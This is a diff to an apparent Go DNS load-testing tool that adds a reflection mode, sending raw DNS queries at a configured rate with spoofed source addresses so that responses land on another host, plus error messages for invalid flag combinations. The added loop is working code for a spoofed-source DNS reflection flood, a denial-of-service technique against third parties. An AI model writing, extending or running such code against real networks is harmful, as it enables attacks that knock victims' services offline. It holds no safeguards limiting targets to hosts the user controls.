@@ -24,7 +24,7 @@ var rateFlag = flag.Uint("r", 1, "Specify the amount of protocol requests per se
 var durationFlag = flag.Uint("D", 60, "Specify the total duration of the test")
 var interfaceFlag = flag.String("i", "", "Specify which interface name to eject packets from (raw packets only)")
 var floodFlag = flag.Bool("F", false, "Specifies if the dns request should be flooded statelessly")
-var reflectionFlag = flag.Bool("R", false, "If set to true the specified then specify the source IPs to spoof the requests from")
+var reflectionFlag = flag.Bool("R", false, "If set to true the specified then specify the source IPs to spoof the requests from. In this case the source IPs are destination IPs and the destination is the source.")
 
 func main() {
 	//Set the runtime to the max number of available CPUs
@@ -163,10 +163,31 @@ func main() {
 		}
 	} else if *reflectionFlag && *floodFlag != true {
 		//reflect off of destination hosts from source IPs
+		for t := range ticker.C {
+			log.Println(t)
+			runCounter = runCounter + 1
+			var i uint
+			for i = 0; i < cfg.Rate; i++ {
+				wg.Add(1)
+				//send flood packet
+				rawQuery := dnsraw.NewRawDNS()
+				rawQuery.SetLocalAddress(cfg.DstIPs[0])
+				rawQuery.SetRemoteAddress(cfg.SrcIPs[0])
+				rawQuery.SetDestPort(cfg.DstPort)
+				go rawQuery.DnsQuery(wg, cfg.Interface.Index, cm)
+			}
+			if runCounter == *durationFlag {
+				wg.Wait()
+				log.Printf("Completed %d queries over %d runs to %s", queryCounter, runCounter, *destIPs)
+				break
+			}
+		}
 	} else if *reflectionFlag && *floodFlag {
 		//not a valid state
+		log.Fatalln("The selection of reflection and flood flags is invalid. Please choose a supported combination.")
 	} else {
 		//no state decided
+		log.Fatalln("Please choose a supported combinatio of operational flags.")
 	}
 
 }
